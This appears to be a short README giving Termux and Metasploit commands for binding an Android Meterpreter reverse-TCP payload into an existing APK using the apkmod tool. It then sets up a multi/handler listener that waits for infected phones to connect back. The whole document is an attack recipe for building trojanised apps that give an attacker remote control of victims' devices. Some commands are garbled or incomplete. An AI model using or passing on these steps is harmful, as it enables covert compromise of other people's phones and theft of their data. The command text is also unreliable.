# Metasploit-binding-payload-in-existing-apk
Metasploit binding payload in existing apk  using apkmod method

$ apt update &&apt upgrade --y
$ pkg install wget
$ pkg install unstable-repo
$ wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh
$ apk mod -u
$ A
$ apkmod -b /sdcard/hack/org.apk -o /sdcard/hack/binded_org.apk LHOST=127.0.0.1 LPORT=4444

$ msfconsole

$ use exploit/multi/handler
$ set payload android/meterpreter/reverse_tcp
$ set lhost
$ set lport
$ exploit


                                               ---Jack Daniel


